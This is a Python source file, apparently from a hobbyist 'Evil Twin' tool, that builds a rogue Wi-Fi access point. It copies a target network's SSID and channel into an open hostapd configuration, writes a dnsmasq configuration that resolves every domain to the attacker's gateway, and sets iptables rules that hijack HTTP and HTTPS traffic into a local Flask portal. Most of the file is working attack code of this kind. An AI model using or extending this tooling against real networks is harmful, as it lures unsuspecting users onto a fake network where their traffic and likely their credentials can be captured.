# =====================================================================
#                   ROUGE AP SETUP
# =====================================================================
"""
0. stopping services conflicts
1. creating hostapd file and run
2. create dnsmasq file and run
3. direwall rules
4. cleaner for firewalls rule, reset services
"""
import sys
import os
import subprocess
import time
import datetime
from pathlib import Path
import netifaces as ni
import ipaddress

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# DONE & WORKING 
def change_ap_settings(interface_name):

    try:
        subprocess.run(["sudo","ip","link","set", interface_name, "down"],check=True)
        subprocess.run(["sudo", "iw", interface_name,"set", "type", "__ap"],check=True)
        subprocess.run(["sudo","ip","link","set", interface_name, "up"], check=True)             
        print(f"[+] {interface_name} is awake and locked in AP Mode!")
        
    except subprocess.CalledProcessError as e:
        if "addr" in e.cmd:#(e, 'cmd', []) changed syntax ---> in e.cmd is always list of strings
            print("[!] Note: IP address 192.168.1.1 might already used")
        else:
            print(f"[-] Failed to reconfigure interface : {e}")
            sys.exit(1)


def start_dns_dhcp():
    print("[*] Stopping existing dnsmasq..")

    try:
        subprocess.run(["sudo", "systemctl", "stop", "dnsmasq"],stderr=subprocess.DEVNULL)
        #subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"],stderr=subprocess.DEVNULL, check=True) #depend on linux dist
        subprocess.run(["sudo", "killall", "dnsmasq"], stderr=subprocess.DEVNULL)
        time.sleep(1)
        print("[*] Launching dnsmasq")
        dnsmasq_proc = subprocess.Popen(
        ["sudo","dnsmasq", "-C", "/etc/dnsmasq.conf", "-d"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT)
        
        time.sleep(2)
        
        if dnsmasq_proc.poll() is not None:
            stdout, stderr = h=dnsmasq_proc.communicate()
            print(f"[-] dnsmasq failed to start. Error output:\n{stderr}")
            print(f"[-] dnsmasq failed to start. Error output:\n{stdout}")
            sys.exit(1)

        return dnsmasq_proc
    
    except subprocess.CalledProcessError as e:
        print(f"[-] dnsmasq configuration failed: {e}")
        exit(1)        

# DONE & WORKING 
def set_firewall_rules(EV_INTERFACE):
    try:

        # Enable IP forwarding
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        
        # Create the custom chain inside mangle (Guaranteed to succeed now!)
        subprocess.run(["sudo", "iptables", "-t", "mangle", "-N", "captive_portal"], check=True)
        
        # Route evil AP traffic into our custom chain
        subprocess.run(["sudo", "iptables", "-t", "mangle", "-A", "PREROUTING", "-i", EV_INTERFACE, "-j", "captive_portal"], check=True)
        
        # Intercept HTTP traffic on port 80 and redirect to Flask portal  , if flask is listening on 80 and not 5000 (the last in the commands) replace to 5000 or for the opposite case 
        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", EV_INTERFACE, "-p", "tcp", "--dport", "80", "-m", "mark", "!", "--mark", "1", "-j", "REDIRECT", "--to-ports", "5000"], check=True)
        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", EV_INTERFACE, "-p", "tcp", "--dport", "443", "-m", "mark", "!", "--mark", "1", "-j", "REDIRECT", "--to-ports", "5000"], check=True)
        # Block internet forwarding for unauthenticated marks
        subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", EV_INTERFACE, "-m", "mark", "!", "--mark", "1", "-j", "DROP"], check=True)
        subprocess.run(["sudo", "iptables", "-I", "INPUT", "-i", EV_INTERFACE, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], check=True)
        subprocess.run(["sudo", "iptables", "-I", "INPUT", "-i", EV_INTERFACE, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], check=True)
        print("[+] Captive portal firewall active.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Firewall rules configuration failed due to: {e}")
        sys.exit(1)

# DONE & WORKING 
def clear_firewall_rules(EV_INTERFACE):
        # Flush all rules in standard (filter), nat, and mangle tables
        subprocess.run(["sudo", "iptables", "-F"], check=False)
        subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], check=False)
        subprocess.run(["sudo", "iptables", "-t", "mangle", "-F"], check=False)
        
        # Unhook the custom chain from the main mangle PREROUTING chain
        subprocess.run(["sudo", "iptables", "-t", "mangle", "-D", "PREROUTING", "-i", EV_INTERFACE, "-j", "captive_portal"], check=False)

        # Delete custom chains from all tables now that they are completely unlocked
        subprocess.run(["sudo", "iptables", "-X"], check=False)
        subprocess.run(["sudo", "iptables", "-t", "nat", "-X"], check=False)
        subprocess.run(["sudo", "iptables", "-t", "mangle", "-X"], check=False)
        
        # Give the kernel a full second to settle the nf_tables state
        time.sleep(1.0)
        print("[+] iptables reset successfully.")

# DONE & WORKING     
def create_hostapd_conf(interface_name, ap,config_path):
    ssid = ap['ssid']
    channel = ap['channel']
    bssid = ap['bssid']
    config_content = f"""interface={interface_name}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wpa=0
"""
    with open(config_path, "w") as f:
        f.write(config_content)
    if os.path.exists(config_path) and os.path.getsize(config_path) > 0:
        print("[+] hostapd configuration file generated successfully.")
    else:
        print("[-] ERROR: Failed to create conf file. Check directory permissions.")

"""
    Create dnsmasq.conf staticly b4 or during run?
"""
def create_dnsmasq_conf(interface_name):
    ip_address = get_interface_ip(interface_name)
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"The IP address of {interface_name} is: {ip_address}")
    ip_obj = ipaddress.IPv4Address(ip_address)

    dhcp_start = str(ip_obj + 49)
    dhcp_end = str(ip_obj + 149)
    dhcp_option3 = f"3,{ip_address}"
    dhcp_option6 = f"6,{ip_address}"


    dnsmasq_content = f"""# Generated by EvilTwin Tool at {current_time}
interface={interface_name}

dhcp-range={dhcp_start},{dhcp_end},255.255.255.0,12h

dhcp-option={dhcp_option3}

dhcp-option={dhcp_option6}


address=/connectivitycheck.gstatic.com/{ip_address}
address=/connectivitycheck.android.com/{ip_address}
address=/clients3.google.com/{ip_address}
address=/captive.apple.com/{ip_address}
address=/#/{ip_address}
"""
    target_file = Path("/etc/dnsmasq.conf").resolve()
    with open(target_file, "w") as file:
        file.write(dnsmasq_content)
    print("Successfully wrote the file!")

# DONE & WORKING 
def create_evil_ap(INTERFACE, ap):
    config_path = os.path.join(SCRIPT_DIR, "temp_hostapd.conf")
    create_hostapd_conf(INTERFACE, ap,config_path)    
    change_ap_settings(INTERFACE)

    try:    
        hostapd_proc = subprocess.Popen(
            ["sudo", "hostapd", config_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True            
        )
         # Give the hardware driver 2 seconds to initialize the radio
        time.sleep(2)
        
        # Check if it crashed immediately (e.g., bad config or driver issue)
        if hostapd_proc.poll() is not None:
            stdout, stderr = hostapd_proc.communicate()
            print(f"[-] hostapd failed to start. Error output:\n{stderr}")
            print(f"[-] hostapd failed to start. Error output:\n{stdout}")
            sys.exit(1)

        print("[+] hostapd is successfully running in the background!")
        print("[+] Your fake access point is now broadcasting.")
        
        print(f" Assigning IP address 192.168.1.1 to {INTERFACE}")
        subprocess.run(["sudo","ip","addr","replace","192.168.1.1/24","dev", INTERFACE],check=True)
        print("[+] Gateway IP 192.168.1.1 configured.")
        print(f"[+] {INTERFACE} is completely ready for hostapd/dnsmasq")

        # IMPORTANT return the process object so the main script can close it later
        return hostapd_proc
    
    except subprocess.CalledProcessError as e:
        if "addr" in e.cmd:#(e, 'cmd', []) changed syntax ---> in e.cmd is always list of strings
            print("[!] Note: IP address 192.168.1.1 might already used")
    except Exception as e:
        print(f"[-] Failed to execute hostapd: {e}")
        sys.exit(1)   

def get_interface_ip(interface_name):
    try:
        # ni.AF_INET represents the IPv4 address family
        addresses = ni.ifaddresses(interface_name)
        ip_info = addresses[ni.AF_INET][0]
        return ip_info["addr"]
    except (ValueError, KeyError, IndexError):
        # ValueError if interface doesn't exist; KeyError/IndexError if it has no IP
        return None

#functions for isolating variables in my code
def setup_network(EV_INTERFACE):
    print("[*] Configuring firewall rules...")
    print("[*] Stopping existing dnsmasq..")

    try:
        subprocess.run(["sudo", "systemctl", "stop", "dnsmasq"],stderr=subprocess.DEVNULL)
        #subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"],stderr=subprocess.DEVNULL, check=True) / depend on linux dist
        subprocess.run(["sudo", "killall", "dnsmasq"], stderr=subprocess.DEVNULL)
        time.sleep(1)
        print("[*] Launching dnsmasq")
        dnsmasq_proc = subprocess.Popen(
        ["sudo","dnsmasq", "-C", "/etc/dnsmasq.conf", "-d"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT)
        
        time.sleep(2)
        
        if dnsmasq_proc.poll() is not None:
            stdout, stderr = h=dnsmasq_proc.communicate()
            print(f"[-] dnsmasq failed to start. Error output:\n{stderr}")
            print(f"[-] dnsmasq failed to start. Error output:\n{stdout}")
            sys.exit(1)
        
        print("[+] dnsmasq is fine, now firewall rules changing...")

    
        # =========================================================================
        # 3. START FRESH RULES (With corrected '-m mark' syntax)
        # =========================================================================
        # Enable IP forwarding
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        
        # Create the custom chain inside mangle (Guaranteed to succeed now!)
        subprocess.run(["sudo", "iptables", "-t", "mangle", "-N", "captive_portal"], check=True)
        
        # Route evil AP traffic into our custom chain
        subprocess.run(["sudo", "iptables", "-t", "mangle", "-A", "PREROUTING", "-i", EV_INTERFACE, "-j", "captive_portal"], check=True)
        
        # Intercept HTTP traffic on port 80 and redirect to Flask portal
        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", EV_INTERFACE, "-p", "tcp", "--dport", "80", "-m", "mark", "!", "--mark", "1", "-j", "REDIRECT", "--to-ports", "5000"], check=True)
        
        # Block internet forwarding for unauthenticated marks
        subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", EV_INTERFACE, "-m", "mark", "!", "--mark", "1", "-j", "DROP"], check=True)
        subprocess.run(["sudo", "iptables", "-I", "INPUT", "-i", EV_INTERFACE, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], check=True)
        subprocess.run(["sudo", "iptables", "-I", "INPUT", "-i", EV_INTERFACE, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], check=True)
        
        print("[+] Captive portal firewall active.")
        return dnsmasq_proc
        
    except subprocess.CalledProcessError as e:
        print(f"[-] Firewall configuration failed: {e}")
        exit(1)

def set_firewall_rules1(EV_INTERFACE):
    try:
        # 1. Enable IP forwarding
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        
        # 2. Clear out any lingering rules to ensure a clean slate
        subprocess.run(["sudo", "iptables", "-F"], check=True)
        subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], check=True)

        # 3. ALLOW local DNS (53) and local HTTP (80) straight to your host machine
        subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", EV_INTERFACE, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], check=True)
        subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", EV_INTERFACE, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], check=True)
        subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", EV_INTERFACE, "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], check=True)

        # 4. FORCE REDIRECT: Intentionally hijack absolutely ALL Port 80 traffic 
        # moving through the interface and hand it directly to Flask.
        subprocess.run([
            "sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", EV_INTERFACE, 
            "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", "5000"
        ], check=True)

        # 5. BLOCK all forwarding to the outside internet by default
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "DROP"], check=True)
        
        print("[+] Captive portal firewall locked down on Port 80.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Firewall setup failed: {e}")


